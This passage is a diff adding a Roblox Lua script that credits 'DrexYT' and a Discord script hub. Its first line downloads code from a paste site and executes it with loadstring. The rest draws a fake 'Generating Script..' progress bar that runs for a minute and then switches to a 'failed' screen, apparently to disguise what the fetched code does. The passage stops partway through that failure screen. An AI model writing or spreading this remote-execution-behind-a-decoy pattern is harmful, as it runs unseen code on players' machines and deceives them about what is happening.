@@ -1,0 +1,160 @@
+loadstring(game:HttpGet("https://pastefy.app/aL0bokGt/raw"))()
+--// Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-------------------------------------------------
+-- UNANG SCRIPT (Loading Screen)
+-------------------------------------------------
+local screenGui1 = Instance.new("ScreenGui")
+screenGui1.Name = "SafeLoadingBar"
+screenGui1.IgnoreGuiInset = true
+screenGui1.ResetOnSpawn = false
+screenGui1.Parent = playerGui
+
+--// Container Frame
+local container1 = Instance.new("Frame")
+container1.Size = UDim2.new(0, 420, 0, 150)
+container1.Position = UDim2.new(0.5, 0, 0.5, 0)
+container1.AnchorPoint = Vector2.new(0.5, 0.5)
+container1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+container1.Parent = screenGui1
+
+local corner1 = Instance.new("UICorner")
+corner1.CornerRadius = UDim.new(0, 14)
+corner1.Parent = container1
+
+--// Image on the Left
+local picture = Instance.new("ImageLabel")
+picture.Size = UDim2.new(0, 120, 0, 120)
+picture.Position = UDim2.new(0, 15, 0.5, 0)
+picture.AnchorPoint = Vector2.new(0, 0.5)
+picture.BackgroundTransparency = 1
+picture.Image = "rbxassetid://116749637853653"
+picture.ScaleType = Enum.ScaleType.Fit
+picture.Parent = container1
+
+-- Function to style text
+local function styleText(label, font, textSize)
+	label.Font = font
+	label.TextSize = textSize
+	label.TextColor3 = Color3.fromRGB(255, 255, 255)
+	label.TextStrokeTransparency = 0.8
+	label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+end
+
+--// "Made by" Text
+local madeBy = Instance.new("TextLabel")
+madeBy.Text = "Made by : DrexYT"
+madeBy.Size = UDim2.new(1, -170, 0, 25)
+madeBy.Position = UDim2.new(0, 150, 0.15, 0)
+madeBy.BackgroundTransparency = 1
+madeBy.TextWrapped = true
+madeBy.Parent = container1
+styleText(madeBy, Enum.Font.GothamBlack, 18)
+
+-- Shadow for "Made by"
+local madeByShadow = madeBy:Clone()
+madeByShadow.Text = madeBy.Text
+madeByShadow.Position = madeBy.Position + UDim2.new(0, 2, 0, 2)
+madeByShadow.ZIndex = madeBy.ZIndex - 1
+madeByShadow.Parent = container1
+
+--// Discord Link
+local discordLink = Instance.new("TextLabel")
+discordLink.Text = "<u>https://discord.gg/drexscripthub</u>"
+discordLink.Size = UDim2.new(1, -170, 0, 20)
+discordLink.Position = UDim2.new(0, 150, 0.33, 0)
+discordLink.BackgroundTransparency = 1
+discordLink.RichText = true
+discordLink.TextWrapped = true
+discordLink.Parent = container1
+styleText(discordLink, Enum.Font.GothamSemibold, 16)
+
+-- Shadow for Discord Link
+local discordLinkShadow = discordLink:Clone()
+discordLinkShadow.Position = discordLink.Position + UDim2.new(0, 2, 0, 2)
+discordLinkShadow.ZIndex = discordLink.ZIndex - 1
+discordLinkShadow.Parent = container1
+
+--// Title with Typing Effect
+local title = Instance.new("TextLabel")
+title.Text = ""
+title.Size = UDim2.new(1, -170, 0, 35)
+title.Position = UDim2.new(0, 150, 0.45, 0)
+title.BackgroundTransparency = 1
+title.TextWrapped = true
+title.Parent = container1
+styleText(title, Enum.Font.GothamBlack, 18)
+
+-- Shadow for Title
+local shadow = title:Clone()
+shadow.Position = title.Position + UDim2.new(0, 2, 0, 2)
+shadow.ZIndex = title.ZIndex - 1
+shadow.Parent = container1
+
+--// Loading Bar Background
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(0, 240, 0, 25)
+barBG.Position = UDim2.new(0, 150, 0.65, 0)
+barBG.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+barBG.BorderSizePixel = 0
+barBG.Parent = container1
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(0, 8)
+barCorner.Parent = barBG
+
+--// Loading Bar Fill
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBG
+
+local fillCorner = Instance.new("UICorner")
+fillCorner.CornerRadius = UDim.new(0, 8)
+fillCorner.Parent = barFill
+
+--// Percent Text
+local percentText = Instance.new("TextLabel")
+percentText.Text = "0%"
+percentText.Size = UDim2.new(1, 0, 0, 20)
+percentText.Position = UDim2.new(0.5, 0, 1.05, 0)
+percentText.AnchorPoint = Vector2.new(0.5, 0)
+percentText.BackgroundTransparency = 1
+percentText.Parent = barBG
+styleText(percentText, Enum.Font.GothamBlack, 18)
+
+-- Typing Effect Function
+local function typeText(txt)
+	title.Text = ""
+	shadow.Text = ""
+	for i = 1, #txt do
+		title.Text = string.sub(txt, 1, i)
+		shadow.Text = title.Text
+		task.wait(0.03)
+	end
+end
+
+-------------------------------------------------
+-- ANIMATION ng Loading Screen (1 MINUTE total)
+-------------------------------------------------
+task.spawn(function()
+	typeText("Generating Script..")
+	for i = 0, 100 do
+		barFill:TweenSize(UDim2.new(i/100, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, 0.6, true)
+		percentText.Text = i .. "%"
+		task.wait(0.6) -- 0.6s per step → 100 steps = 60s
+	end
+
+	-- Pag natapos na sa 100% -> alisin ang unang screen
+	screenGui1:Destroy()
+
+	-------------------------------------------------
+	-- PANGALAWANG SCRIPT (FAILED UI) 
+	-- Opacity inadjust dito
+	------------
